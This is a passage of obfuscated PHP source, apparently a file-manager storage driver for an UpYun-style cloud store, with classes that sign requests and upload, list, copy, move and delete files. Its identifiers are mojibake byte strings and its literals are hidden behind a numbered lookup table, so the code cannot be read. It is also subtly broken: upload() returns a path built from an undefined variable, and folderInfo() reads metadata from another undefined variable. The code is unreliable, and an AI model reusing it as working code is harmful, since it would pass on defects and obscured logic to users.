parent::fileOutImageServer($ß¥“—éì, $»—ÇÄû¹); } parent::fileOutImage($ß¥“—éì, $»—ÇÄû¹); } public function fileOutLink($‡ÓµØÅ¸) { $éÂä½Ä² =& $_SERVER[§ŒØóıü]; if (substr($‡ÓµØÅ¸, 0, 7) == $éÂä½Ä²[1343]) { $‡ÓµØÅ¸ = $éÂä½Ä²[1344] . substr($‡ÓµØÅ¸, 7); } header($éÂä½Ä²[161] . $‡ÓµØÅ¸); die; } public function getHost() { $ÍÉƒˆÅ =& $_SERVER[§ŒØóıü]; $ºÉëÉ» = str_rtrim(parent::getHost(), $ÍÉƒˆÅ[8] . $this->bucket); $ºÉëÉ» = explode($ÍÉƒˆÅ[184], $ºÉëÉ»); return $ºÉëÉ»[0] . $ÍÉƒˆÅ[184] . $this->bucket . $ÍÉƒˆÅ[10] . $ºÉëÉ»[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($âÙª…š, $Šú³Ôµû = 0) { parent::__construct(); $this->source = $âÙª…š; $this->sourceSize = $Šú³Ôµû; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ºÒß’­œ = false) { return $this->sourceSize; } public function getContent($²¶…Ä™ = false) { return $this->fileSubstr($²¶…Ä™, 0, $this->sourceSize); } public function fileSubstr($£æÅÅæù = false, $º—Äğªû = 0, $İˆ›£™ = 0) { if (!$İˆ›£™) { $İˆ›£™ = $this->sourceSize; } $ÒÔæ¹‹Ê = $this->sourceSize - $º—Äğªû; if ($İˆ›£™ >= $ÒÔæ¹‹Ê) { $İˆ›£™ = $ÒÔæ¹‹Ê; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $º—Äğªû, $İˆ›£™); } if ($this->sourceType == self::TYPE_FILE) { if ($İˆ›£™ <= 0) { return $_SERVER[§ŒØóıü][12]; } $¤÷¨Û¤¿ = ftell($this->source); fseek_64($this->source, $¤÷¨Û¤¿ + $º—Äğªû); $ò¯øúş‹ = @fread($this->source, $İˆ›£™); fseek_64($this->source, $¤÷¨Û¤¿); return $ò¯øúş‹; } } public function hashMd5($»­ØÚÜè = false) { return md5($this->getContent()); } public static function hash($“ÙÓï…Ó, $©›Ëä€ = 0) { $ª²ˆ›Ä = new PathDriverStream($“ÙÓï…Ó, $©›Ëä€); return $ª²ˆ›Ä->hashSimple($“ÙÓï…Ó); } public static function md5($ıœôµî, $¯ Ã‡Ò = 0) { $Õ¬¢Î«ö = new PathDriverStream($ıœôµî, $¯ Ã‡Ò); return $Õ¬¢Î«ö->hashMd5($ıœôµî); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\x74\x70\x3a\57\57\166\x30\56\x61\160\151\56\x75\x70\171\x75\156\x2e\x63\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($§ä¡†Ñ‚) { parent::__construct(); $this->_init($§ä¡†Ñ‚); } public function _init($ÏøŸÍÍª) { $ê…ÙÂ²¡ =& $_SERVER[§ŒØóıü]; foreach ($ÏøŸÍÍª as $—¯ÓË” => $ÅÌŸøÙÉ) { if (isset($this->{$—¯ÓË”})) { $this->{$—¯ÓË”} = $ÅÌŸøÙÉ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ê…ÙÂ²¡[1472] . LNG($ê…ÙÂ²¡[1403])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ó¿ıØ’ï, $Ü»†ìÊÓ = "\107\x45\x54") { $®±Ôàä =& $_SERVER[§ŒØóıü]; $ĞõÍê = gmdate($®±Ôàä[1436]); $¥Ô°”ÎÜ = base64_encode(hash_hmac($®±Ôàä[1473], "{$Ü»†ìÊÓ}\46{$ó¿ıØ’ï}\x26{$ĞõÍê}", md5("{$this->userpass}"), !0)); $æ×§®Ã¸ = array("\101\x75\x74\150\157\162\x69\172\141\164\x69\x6f\156\72\x55\120\x59\125\x4e\x20{$this->username}\x3a{$¥Ô°”ÎÜ}", "\x44\x61\x74\145\72{$ĞõÍê}"); return $æ×§®Ã¸; } public function ussRequest($¢È“·¥, $§ı£Ÿƒ = "\107\x45\x54", $áñĞ”¯‚ = false, $ş¯Ÿ¼Ç• = false, $„Ï¡Ù†Ù = false) { $Çò¦ø¥  =& $_SERVER[§ŒØóıü]; $¢È“·¥ = trim($¢È“·¥, $Çò¦ø¥ [8]); $×ŒÒî«‰ = "\57{$this->bucket}\x2f{$¢È“·¥}"; $ÏÍ°Îäµ = $this->ussHeaders($×ŒÒî«‰, $§ı£Ÿƒ); if ($ş¯Ÿ¼Ç•) { $ÏÍ°Îäµ = array_merge($ÏÍ°Îäµ, $ş¯Ÿ¼Ç•); } $„ÔåÂÊÒ = url_request($this->endpoint . $×ŒÒî«‰, $§ı£Ÿƒ, $áñĞ”¯‚, $ÏÍ°Îäµ, $„Ï¡Ù†Ù); if (!$„ÔåÂÊÒ) { return array($Çò¦ø¥ [1218] => !1, $Çò¦ø¥ [1208] => $Çò¦ø¥ [1474]); } if (strtolower($§ı£Ÿƒ) == $Çò¦ø¥ [197] || in_array($„ÔåÂÊÒ[$Çò¦ø¥ [1218]], array($Çò¦ø¥ [1328], $Çò¦ø¥ [1475]))) { $áñĞ”¯‚ = $„ÔåÂÊÒ[$Çò¦ø¥ [1476]]; } else { $áñĞ”¯‚ = json_decode($„ÔåÂÊÒ[$Çò¦ø¥ [1208]], !0); if (!$áñĞ”¯‚) { $áñĞ”¯‚ = $„ÔåÂÊÒ[$Çò¦ø¥ [1208]]; } else { if (!$„ÔåÂÊÒ[$Çò¦ø¥ [755]] && isset($áñĞ”¯‚[$Çò¦ø¥ [1477]])) { $áñĞ”¯‚ = $áñĞ”¯‚[$Çò¦ø¥ [1477]]; } } } return array($Çò¦ø¥ [1218] => $„ÔåÂÊÒ[$Çò¦ø¥ [755]], $Çò¦ø¥ [1208] => $áñĞ”¯‚); } public function mkfile($¦šìè, $ù©üõ¡® = '', $ø¬‹åÑ = REPEAT_RENAME) { if ($this->setContent($¦šìè, $ù©üõ¡®)) { return $this->getPathOuter($¦šìè); } return !1; } public function mkdir($Ñç¸¬×Æ, $ä”çë•Ö = REPEAT_SKIP) { $¾æ»Ëã® =& $_SERVER[§ŒØóıü]; $ÏöŞÁè = trim($Ñç¸¬×Æ, $¾æ»Ëã®[8]); if ($this->_isFolder($ÏöŞÁè)) { return $this->getPathOuter($ÏöŞÁè); } $Ã·êÈºë = array($¾æ»Ëã®[1478]); $²±İŸÊ = $this->ussRequest($ÏöŞÁè, $¾æ»Ëã®[226], !1, $Ã·êÈºë); return $²±İŸÊ[$¾æ»Ëã®[1218]] ? $this->getPathOuter($ÏöŞÁè) : !1; } public function copyFile($åø°ëúÉ, $çûùªİ) { $êåÇüÏ =& $_SERVER[§ŒØóıü]; $ñçŠ¦Ã‘ = array($êåÇüÏ[1479] . "\x2f{$this->bucket}\57{$åø°ëúÉ}", $êåÇüÏ[1480]); $‰ëı±Ï€ = $this->ussRequest($çûùªİ, $êåÇüÏ[228], !1, $ñçŠ¦Ã‘); return $‰ëı±Ï€[$êåÇüÏ[1218]] ? !0 : $this->getPathOuter($çûùªİ); } public function moveFile($ÂåÇøÛ, $è¢ªÎÊË) { $‰×ò›ì =& $_SERVER[§ŒØóıü]; $Ç¨†áíÑ = array($‰×ò›ì[1481] . "\57{$this->bucket}\x2f{$ÂåÇøÛ}", $‰×ò›ì[1480]); $†¤á¹ß‘ = $this->ussRequest($è¢ªÎÊË, $‰×ò›ì[228], !1, $Ç¨†áíÑ); return $†¤á¹ß‘[$‰×ò›ì[1218]] ? !0 : $this->getPathOuter($è¢ªÎÊË); } public function delFile($ÕÛ×½Ú) { $›¤‚ŸË =& $_SERVER[§ŒØóıü]; $àÚòï†œ = $this->ussRequest($ÕÛ×½Ú, $›¤‚ŸË[1482]); return $àÚòï†œ[$›¤‚ŸË[1218]] ? !0 : !1; } public function delFolder($Í¥ğËé”) { $˜ÒğÅšú =& $_SERVER[§ŒØóıü]; if (!$this->exist($Í¥ğËé”)) { return !0; } $this->listItemCache = !1; $½ø‘‚™” = $îÚĞ¾¿ = array(); $this->fileList($Í¥ğËé”, $½ø‘‚™”, $îÚĞ¾¿, !0); $this->listItemCache = !0; foreach ($îÚĞ¾¿ as $Ê·”ãÁ) { $¥í¾¨† = $this->ussRequest($Ê·”ãÁ[$˜ÒğÅšú[32]], $˜ÒğÅšú[1482]); if (!$¥í¾¨†[$˜ÒğÅšú[1218]]) { return !1; } } foreach ($½ø‘‚™” as $úíÃ ) { $¥í¾¨† = $this->ussRequest($úíÃ , $˜ÒğÅšú[1482]); if (!$¥í¾¨†[$˜ÒğÅšú[1218]]) { return !1; } } $¥í¾¨† = $this->ussRequest($Í¥ğËé”, $˜ÒğÅšú[1482]); return $¥í¾¨†[$˜ÒğÅšú[1218]]; } public function rename($¯ÁÆÜı€, $ö‘ ÑÄ§) { if ($this->isFile($¯ÁÆÜı€)) { $ö‘ ÑÄ§ = get_path_father($¯ÁÆÜı€) . $ö‘ ÑÄ§; return $this->moveFile($¯ÁÆÜı€, $ö‘ ÑÄ§); } return $this->renameObject($¯ÁÆÜı€, $ö‘ ÑÄ§); } public function fileInfo($ÊŠ¾¡·–, $Š§×®¹é = false, $ü¦šß–¶ = array()) { $†²£ »ù =& $_SERVER[§ŒØóıü]; $ö×æëĞé = array($†²£ »ù[32] => $this->pathThis($ÊŠ¾¡·–), $†²£ »ù[84] => $this->getPathOuter($†²£ »ù[8] . $ÊŠ¾¡·–), $†²£ »ù[33] => $†²£ »ù[200], $†²£ »ù[76] => isset($ü¦šß–¶[$†²£ »ù[76]]) ? $ü¦šß–¶[$†²£ »ù[76]] : 0, $†²£ »ù[174] => $this->ext($ÊŠ¾¡·–)); if ($Š§×®¹é) { return $ö×æëĞé; } $ö×æëĞé[$†²£ »ù[201]] = $ö×æëĞé[$†²£ »ù[85]] = 0; $ö×æëĞé[$†²£ »ù[202]] = $ö×æëĞé[$†²£ »ù[203]] = !0; if (empty($ü¦šß–¶)) { $ü¦šß–¶ = $this->objectMeta($ÊŠ¾¡·–); if (!$ü¦šß–¶) { return $ö×æëĞé; } } $ö×æëĞé[$†²£ »ù[201]] = intval($ü¦šß–¶[$†²£ »ù[1483]]); $ö×æëĞé[$†²£ »ù[85]] = intval($ü¦šß–¶[$†²£ »ù[1484]]); $ö×æëĞé[$†²£ »ù[76]] = $ü¦šß–¶[$†²£ »ù[76]]; return $ö×æëĞé; } public function folderInfo($µ¦¥€Ğ, $ôÂ°±Ê = false) { $Ó´ù® =& $_SERVER[§ŒØóıü]; $œ¸ĞÌÕ‚ = array($Ó´ù®[32] => $this->pathThis($µ¦¥€Ğ), $Ó´ù®[84] => $this->getPathOuter($Ó´ù®[8] . $µ¦¥€Ğ), $Ó´ù®[33] => $Ó´ù®[75]); if ($ôÂ°±Ê) { return $œ¸ĞÌÕ‚; } $œ¸ĞÌÕ‚[$Ó´ù®[201]] = $œ¸ĞÌÕ‚[$Ó´ù®[85]] = 0; $œ¸ĞÌÕ‚[$Ó´ù®[202]] = $œ¸ĞÌÕ‚[$Ó´ù®[203]] = !0; if (empty($åÏâàÏİ)) { $åÏâàÏİ = $this->objectMeta($µ¦¥€Ğ); if (!$åÏâàÏİ) { return $œ¸ĞÌÕ‚; } } $œ¸ĞÌÕ‚[$Ó´ù®[201]] = intval($åÏâàÏİ[$Ó´ù®[1483]]); $œ¸ĞÌÕ‚[$Ó´ù®[85]] = intval($åÏâàÏİ[$Ó´ù®[1484]]); return $œ¸ĞÌÕ‚; } private function listObjs($ùÓŞÛÛ, $ÚäöÚ³ò = 0, $¡Şèäé§ = 1000) { $Çë‘± =& $_SERVER[§ŒØóıü]; $àÕïªæÙ = array($Çë‘±[1485], $Çë‘±[1486] . $¡Şèäé§); if ($ÚäöÚ³ò) { $àÕïªæÙ[] = $Çë‘±[1487] . $ÚäöÚ³ò; } $æ¯Â® Ú = $this->ussRequest($ùÓŞÛÛ, $Çë‘±[230], !1, $àÕïªæÙ); return !$æ¯Â® Ú[$Çë‘±[1218]] ? !1 : $æ¯Â® Ú[$Çë‘±[1208]]; } private function fileList($Øóäââº, &$Ééˆñä, &$Ò ×Šı÷, $ÃÙšÙ“á = false) { $ì·¿Å§— =& $_SERVER[§ŒØóıü]; $¦ı‹ĞÄ­ = $ì·¿Å§—[12]; $Ì¼›í‰‹ = 1000; $¨Ø¿š×é = rtrim($Øóäââº, $ì·¿Å§—[8]) . $ì·¿Å§—[8]; while (!0) { check_abort(); $ô„¡ÌÕË = $this->listObjs($Øóäââº, $¦ı‹ĞÄ­, $Ì¼›í‰‹); if (!$ô„¡ÌÕË) { return !1; } $¦ı‹ĞÄ­ = isset($ô„¡ÌÕË[$ì·¿Å§—[1488]]) ? $ô„¡ÌÕË[$ì·¿Å§—[1488]] : $ì·¿Å§—[12]; $Ã¶‰˜¸« = isset($ô„¡ÌÕË[$ì·¿Å§—[1489]]) ? $ô„¡ÌÕË[$ì·¿Å§—[1489]] : array(); foreach ($Ã¶‰˜¸« as $¥€² Æ’) { $šÃÎŞ† = $¥€² Æ’[$ì·¿Å§—[33]] == $ì·¿Å§—[75] ? !0 : !1; $ï›­¨ª´ = ltrim($¨Ø¿š×é . $¥€² Æ’[$ì·¿Å§—[32]], $ì·¿Å§—[8]) . ($šÃÎŞ† ? $ì·¿Å§—[8] : $ì·¿Å§—[12]); $¶äÖ™«‚ = array($ì·¿Å§—[32] => $ï›­¨ª´, $ì·¿Å§—[33] => $šÃÎŞ† ? $ì·¿Å§—[75] : $ì·¿Å§—[200], $ì·¿Å§—[76] => $¥€² Æ’[$ì·¿Å§—[337]], $ì·¿Å§—[1484] => $¥€² Æ’[$ì·¿Å§—[1490]]); $this->cacheMethodInfoSet($ï›­¨ª´, $šÃÎŞ†, $¶äÖ™«‚); if ($šÃÎŞ†) { $Ééˆñä[] = $ï›­¨ª´; if ($ÃÙšÙ“á) { $this->fileList($ï›­¨ª´, $Ééˆñä, $Ò ×Šı÷, $ÃÙšÙ“á); } continue; } $Ò ×Šı÷[] = $¶äÖ™«‚; } if (count($Ã¶‰˜¸«) < $Ì¼›í‰‹) { break; } } $this->cacheMethodInfoSet($Øóäââº, !0); } public function listPath($ÅÅëôÒ³, $—Š¸£ı‹ = false) { $±ÄÖè–Œ =& $_SERVER[§ŒØóıü]; $Ó‚—­™ğ = $œŠíê = array(); $this->fileList($ÅÅëôÒ³, $Ó‚—­™ğ, $œŠíê); foreach ($Ó‚—­™ğ as $¾¨¼–µÑ => $¤ü ˆµš) { $Ó‚—­™ğ[$¾¨¼–µÑ] = $this->folderInfo($¤ü ˆµš, $—Š¸£ı‹); } foreach ($œŠíê as $¾¨¼–µÑ => $¤ü ˆµš) { $œŠíê[$¾¨¼–µÑ] = $this->fileInfo($¤ü ˆµš[$±ÄÖè–Œ[32]], $—Š¸£ı‹, $¤ü ˆµš); } return array($±ÄÖè–Œ[82] => $Ó‚—­™ğ, $±ÄÖè–Œ[83] => $œŠíê); } public function has($×Ãêîµ, $É­‘È­¬ = false, $âô™¤­ = true) { $ïû˜½ª• =& $_SERVER[§ŒØóıü]; $÷¥ÆÖ¯Ø = $ïû˜½ª•[12]; $°ˆàº€ = 500; $éÄ«ÇÙÀ = 0; $±Õßòá† = 0; $€†ÂÜç€ = rtrim($×Ãêîµ, $ïû˜½ª•[8]) . $ïû˜½ª•[8]; while (!0) { check_abort(); $¹·Á™ïõ = $this->listObjs($×Ãêîµ, $÷¥ÆÖ¯Ø, $°ˆàº€); if (!$¹·Á™ïõ) { return !1; } $÷¥ÆÖ¯Ø = isset($¹·Á™ïõ[$ïû˜½ª•[1488]]) ? $¹·Á™ïõ[$ïû˜½ª•[1488]] : $ïû˜½ª•[12]; $éáÔôš€ = isset($¹·Á™ïõ[$ïû˜½ª•[1489]]) ? $¹·Á™ïõ[$ïû˜½ª•[1489]] : array(); if (empty($éáÔôš€)) { break; } $Ù–¶«ùƒ = array_filter($éáÔôš€, function ($’’›üò¢) { $’…êı Ô =& $_SERVER[§ŒØóıü]; return $’’›üò¢[$’…êı Ô[33]] == $’…êı Ô[75]; }); $Òêô£¬î = count($éáÔôš€); $Ù–¶«ùƒ = count($Ù–¶«ùƒ); $¶ñ«‚ = $Òêô£¬î - $Ù–¶«ùƒ; if ($É­‘È­¬) { $±Õßòá† += $Ù–¶«ùƒ; $éÄ«ÇÙÀ += $¶ñ«‚; if ($Òêô£¬î < $°ˆàº€) { break; } continue; } if ($âô™¤­) { if ($¶ñ«‚) { return !0; } } else { if ($Ù–¶«ùƒ) { return !0; } } if ($Òêô£¬î < $°ˆàº€) { break; } } if ($É­‘È­¬) { return array($ïû˜½ª•[207] => $éÄ«ÇÙÀ, $ïû˜½ª•[208] => $±Õßòá†); } return !1; } public function listAll($ã±½Ìäè) { $ŸË˜²Û =& $_SERVER[§ŒØóıü]; $×îÌî¢à = $ªğ€ÕãÅ = array(); $this->fileList($ã±½Ìäè, $×îÌî¢à, $ªğ€ÕãÅ, !0); $•“ÙĞ–’ = array_to_keyvalue($ªğ€ÕãÅ, $ŸË˜²Û[32]); foreach ($×îÌî¢à as $¹Â»Ò) { if (is_string($¹Â»Ò)) { $•“ÙĞ–’[$¹Â»Ò] = array($ŸË˜²Û[76] => 0); } } return $this->listAllFiles($ã±½Ìäè, $•“ÙĞ–’); } public function canRead($úï©•‹†) { return $this->exist($úï©•‹†) ? !0 : !1; } public function canWrite($¹ ”ªš£) { return $this->exist($¹ ”ªš£) ? !0 : !1; } public function getContent($µ»ÖŠíÏ) { return $this->fileSubstr($µ»ÖŠíÏ, 0, -1); } public function setContent($•œ¿öä…, $îÈŸÎçâ = '') { $‹Óú¬« =& $_SERVER[§ŒØóıü]; if (!$îÈŸÎçâ) { $Ò®şãÆ = $this->ussRequest($•œ¿öä…, $‹Óú¬«[226]); return $Ò®şãÆ[$‹Óú¬«[1218]]; } $—óœÚÎâ = $this->tempFile($this->pathThis($•œ¿öä…)); file_put_contents($—óœÚÎâ, $îÈŸÎçâ); if ($this->upload($•œ¿öä…, $—óœÚÎâ)) { $this->tempFileRemve($—óœÚÎâ); return !0; } return !1; } public function fileSubstr($ÕÊ¦©ğ, $¦ìÚ»È’, $§Ê¢ú²) { $ëÌáêş˜ =& $_SERVER[§ŒØóıü]; if (!($Â°€ÒÉ¹ = $this->link($ÕÊ¦©ğ))) { return !1; } $Ñ €°®º = !1; if ($§Ê¢ú² > 0) { $Ù÷ŒËÜñ = $¦ìÚ»È’ + $§Ê¢ú² - 1; $Ñ €°®º = array($ëÌáêş˜[1451] . $¦ìÚ»È’ . $ëÌáêş˜[386] . $Ù÷ŒËÜñ); } $­›­î» = url_request($Â°€ÒÉ¹, $ëÌáêş˜[230], !1, $Ñ €°®º); return $­›­î»[$ëÌáêş˜[755]] ? $­›­î»[$ëÌáêş˜[1208]] : !1; } public function upload($ûÂ­À¬, $°°×±¸Ó, $†ŒÏ£‘¹ = false, $Ùõˆ øØ = REPEAT_REPLACE) { $â„Ü±¾ =& $_SERVER[§ŒØóıü]; $—Ó·ô‰ô = IO::size($°°×±¸Ó); if ($—Ó·ô‰ô <= 1024 * 1024 * 200) { $¸Éæš‚Œ = array($â„Ü±¾[1491] . $°°×±¸Ó); $ÀùßÜ’ = $this->ussRequest($ûÂ­À¬, $â„Ü±¾[228], $¸Éæš‚Œ); return $ÀùßÜ’[$â„Ü±¾[1218]] ? $this->getPathOuter($ûÂ­À¬) : !1; } $ÔÎîï¢Æ = 1024 * 1024 * 10; $«ÛÔ—Ö§ = array($â„Ü±¾[1492], $â„Ü±¾[1493] . $—Ó·ô‰ô, $â„Ü±¾[1494], $â„Ü±¾[1495] . $ÔÎîï¢Æ); $ÀùßÜ’ = $this->ussRequest($ûÂ­À¬, $â„Ü±¾[228], !1, $«ÛÔ—Ö§); if (!$ÀùßÜ’[$â„Ü±¾[1218]]) { return !1; } $ÃíÑù’ = $ÀùßÜ’[$â„Ü±¾[1208]]; $¿“”ºô = 0; $¦øĞÔ™ = $ÃíÑù’[$â„Ü±¾[1496]]; $°æ´Û§› = fopen($°°×±¸Ó, $â„Ü±¾[1400]); if (!$°æ´Û§›) { return !1; } do { $¹•¬ßÒ© = $ÃíÑù’[$â„Ü±¾[1497]]; fseek_64($°æ´Û§›, $¿“”ºô); $¯øÃ”µó = fread($°æ´Û§›, $¹•¬ßÒ©); $òÀÂòÂû = 0; do { $òÀÂòÂû++; $ÃíÑù’ = $this->uploadPart($ûÂ­À¬, $ÃíÑù’, $¯øÃ”µó); } while (!$ÃíÑù’ && $òÀÂòÂû < 3); if (!$ÃíÑù’) { return !1; } $¦øĞÔ™ = $ÃíÑù’[$â„Ü±¾[1496]]; $¿“”ºô += $¹•¬ßÒ©; } while ($¦øĞÔ™ != -1); fclose($°æ´Û§›); $«ÛÔ—Ö§ = array($â„Ü±¾[1498], $â„Ü±¾[1499] . $ÃíÑù’[$â„Ü±¾[1500]], $â„Ü±¾[1494]); $ÀùßÜ’ = $this->ussRequest($ûÂ­À¬, $â„Ü±¾[228], !1, $«ÛÔ—Ö§); return $ÀùßÜ’[$â„Ü±¾[1218]] ? $this->getPathOuter($Íûéİ—‚) : !1; } private function uploadPart($øÎ¥¥ƒ, $œú½°“µ, &$»°”İ³) { $è—’Å« =& $_SERVER[§ŒØóıü]; $Öñ™º÷î = array($è—’Å«[1501], $è—’Å«[1499] . $œú½°“µ[$è—’Å«[1500]], $è—’Å«[1502] . $œú½°“µ[$è—’Å«[1496]], $è—’Å«[142] . $œú½°“µ[$è—’Å«[1497]]); $«Š‘×åÒ = $this->ussRequest($øÎ¥¥ƒ, $è—’Å«[228], $»°”İ³, $Öñ™º÷î); return !$«Š‘×åÒ[$è—’Å«[1218]] ? $«Š‘×åÒ[$è—’Å«[1218]] : $«Š‘×åÒ[$è—’Å«[1208]]; } public function uploadFormData($Á®›öÁÒ, $‡Î¤çŸ = 3600) { return $this->uploadPolicy($Á®›öÁÒ, $‡Î¤çŸ); } public function multiUploadFormData($±°¯øÍ, $˜¬“¸Ä = 3600) { $”£µğèÑ =& $_SERVER[§ŒØóıü]; $Ş›“ÍĞé = (int) $GLOBALS[$”£µğèÑ[7]][$”£µğèÑ[76]]; return $this->uploadPolicy($±°¯øÍ, $˜¬“¸Ä, $Ş›“ÍĞé); } private function uploadPolicy($´ÊùÂşø, $¾ÄÈ”¦Ç = 3600, $±Ä§Õ× = 0) { $ÜÓ•Æø =& $_SERVER[§ŒØóıü]; $¶»³‚Ïš = $ÜÓ•Æø[8] . $this->bucket; $½”·¥ ë = gmdate($ÜÓ•Æø[1436]); $È÷· º« = array($ÜÓ•Æø[1503] => $this->bucket, $ÜÓ•Æø[1504] => $´ÊùÂşø, $ÜÓ•Æø[1505] => time() + $¾ÄÈ”¦Ç, $ÜÓ•Æø[1506] => $½”·¥ ë); if ($±Ä§Õ×) { $È÷· º«[$ÜÓ•Æø[1416]] = $±Ä§Õ×; } $ŒËÔà ğ = base64_encode(json_encode($È÷· º«)); $ŸÉ¶åÖ¡ = base64_encode(hash_hmac($ÜÓ•Æø[1473], "\x50\117\x53\x54\46{$¶»³‚Ïš}\46{$½”·¥ ë}\x26{$ŒËÔà ğ}", md5("{$this->userpass}"), !0)); $Øê˜èÃ = array($ÜÓ•Æø[1340] => $ŒËÔà ğ, $ÜÓ•Æø[1507] => "\x55\x50\131\125\116\40{$this->username}\72{$ŸÉ¶åÖ¡}", $ÜÓ•Æø[182] => $this->endpoint . $¶»³‚Ïš); return $Øê˜èÃ; } public function download($½Íı§­±, $«š—ğ¸) { $·ûºÊ Ã = IO::getPathInner(IO::mkfile($«š—ğ¸)); if (!($Ú¡×Õ³ = $this->link($½Íı§­±))) { return !1; } $èñ¶¶Š = 0; $Ã£À›¿Í = 1024 * 200; $ıšÛ¢ƒ = fopen($·ûºÊ Ã, $_SERVER[§ŒØóıü][1457]); while (!0) { $œ»Û¥Ï½ = $this->fileSubstr($½Íı§­±, $èñ¶¶Š, $Ã£À›¿Í); if ($œ»Û¥Ï½ === !1) { return !1; } fwrite($ıšÛ¢ƒ, $œ»Û¥Ï½); $èñ¶¶Š += $Ã£À›¿Í; if (strlen($œ»Û¥Ï½) < $Ã£À›¿Í) { break; } } fclose($ıšÛ¢ƒ); return $«š—ğ¸; } public function link($ï‚£Íé«, $´æñ­ù£ = array()) { $¬ÂÙ®¸ =& $_SERVER[§ŒØóıü]; $ï‚£Íé« = trim($ï‚£Íé«, $¬ÂÙ®¸[8]); if (!empty($this->token)) { $ôğå€® = strtotime(date($¬ÂÙ®¸[1508])); $¡÷Ã€Ê  = substr(md5($this->token . $¬ÂÙ®¸[284] . $ôğå€® . $¬ÂÙ®¸[1509] . $ï‚£Íé«), 12, 8) . $ôğå€®; $´æñ­ù£[] = $¬ÂÙ®¸[1510] . $¡÷Ã€Ê ; } $·´‘ íõ = !empty($´æñ­ù£) ? $¬ÂÙ®¸[73] . implode($¬ÂÙ®¸[284], $´æñ­ù£) : $¬ÂÙ®¸[12]; return $this->getHost() . $¬ÂÙ®¸[8] . $ï‚£Íé« . $·´‘ íõ; } public function fileOut($«¢—Ì÷½, $ä¨´Ê™ = false, $“Ãúè³ì = false, $£ø½şß½ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($«¢—Ì÷½, $ä¨´Ê™, $“Ãúè³ì, $£ø½şß½); } if (!$“Ãúè³ì) { $“Ãúè³ì = $this->pathThis($«¢—Ì÷½); } $ÍßÚÍõ¦ = $ä¨´Ê™ ? array($_SERVER[§ŒØóıü][1511] . rawurlencode($“Ãúè³ì)) : array(); $©ó¨’Ú® = $this->link($«¢—Ì÷½, $ÍßÚÍõ¦); $this->fileOutLink($©ó¨’Ú®); } public function fileOutServer($•üÔê¡ˆ, $îĞ®À´ˆ = false, $´•Áï’— = false, $‚ÍİãšÙ = '') { parent::fileOut($•üÔê¡ˆ, $îĞ®À´ˆ, $´•Áï’—, $‚ÍİãšÙ); } public function fileOutImage($æ“£÷ùª, $£ıóé¼à = 250) { $³¥”ÛóŒ = $this->link($æ“£÷ùª . $_SERVER[§ŒØóıü][1512] . $£ıóé¼à); $this->fileOutLink($³¥”ÛóŒ); } public function fileOutImageServer($´ ×†ï, $‰„¦ê = 250) { parent::fileOutImage($´ ×†ï, $‰„¦ê); } public function hashMd5($‚ø‡ğ«) { $ãŠøÕü˜ =& $_SERVER[§ŒØóıü]; $ß³Òù§ó = $this->_objectMeta($‚ø‡ğ«); return isset($ß³Òù§ó[$ãŠøÕü˜[212]]) ? $ß³Òù§ó[$ãŠøÕü˜[212]] : !1; } public function size($‘‚ÁëŠÒ) { $ƒ¼ÔÅõ° = $this->objectMeta($‘‚ÁëŠÒ); return $ƒ¼ÔÅõ° ? $ƒ¼ÔÅõ°[$_SERVER[§ŒØóıü][76]] : 0; } public function info($ÁŠïíÑŒ) { if ($this->isFolder($ÁŠïíÑŒ)) { return $this->folderInfo($ÁŠïíÑŒ); } else { if ($this->isFile($ÁŠïíÑŒ)) { return $this->fileInfo($ÁŠïíÑŒ); } } return !1; } public function exist($‘åŸÒ£æ) { return $this->isFile($‘åŸÒ£æ) || $this->isFolder($‘åŸÒ£æ); } public function isFile($Û‚øùãõ) { return !$this->isFolder($Û‚øùãõ) && $this->objectMeta($Û‚øùãõ); } public function isFolder($ş½µû) { return $this->cacheMethod($_SERVER[§ŒØóıü][165], $ş½µû); } protected function objectMeta($Ó»Åêö) { return $this->cacheMethod($_SERVER[§ŒØóıü][167], $Ó»Åêö); } protected function _objectMeta($ëûÖ¶¹Œ) { $¥…Ç“Îñ =& $_SERVER[§ŒØóıü]; if ($ëûÖ¶¹Œ == $¥…Ç“Îñ[12] || $ëûÖ¶¹Œ == $¥…Ç“Îñ[8]) { return array(); } $»„ˆŸ®À = $this->ussRequest($ëûÖ¶¹Œ, $¥…Ç“Îñ[1513]); if (!$»„ˆŸ®À[$¥…Ç“Îñ[1218]]) { return null; } $¹·³Û²â = isset($»„ˆŸ®À[$¥…Ç“Îñ[1208]]) ? $»„ˆŸ®À[$¥…Ç“Îñ[1208]] : array(); if (!isset($¹·³Û²â[$¥…Ç“Îñ[1514]])) { return null; } $Ü—ÇĞØ× = array($¥…Ç“Îñ[33] => isset($¹·³Û²â[$¥…Ç“Îñ[1514]]) ? $¹·³Û²â[$¥…Ç“Îñ[1514]] : null, $¥…Ç“Îñ[76] => isset($¹·³Û²â[$¥…Ç“Îñ[1515]]) ? $¹·³Û²â[$¥…Ç“Îñ[1515]] : null, $¥…Ç“Îñ[212] => isset($¹·³Û²â[$¥…Ç“Îñ[1516]]) ? $¹·³Û²â[$¥…Ç“Îñ[1516]] : null, $¥…Ç“Îñ[1483] => isset($¹·³Û²â[$¥…Ç“Îñ[1517]]) ? $¹·³Û²â[$¥…Ç“Îñ[1517]] : null); $Ü—ÇĞØ×[$¥…Ç“Îñ[1484]] = isset($¹·³Û²â[$¥…Ç“Îñ[1518]]) ? strtotime($¹·³Û²â[$¥…Ç“Îñ[1518]]) : $Ü—ÇĞØ×[$¥…Ç“Îñ[1483]]; return $Ü—ÇĞØ×; } protected function _isFolder($‹ÀÁ—»©) { $Õù•™‘Ï =& $_SERVER[§ŒØóıü]; if ($‹ÀÁ—»© == $Õù•™‘Ï[12] || $‹ÀÁ—»© == $Õù•™‘Ï[8]) { return !0; } $ƒƒ¨í£ = $this->_objectMeta($‹ÀÁ—»©); return 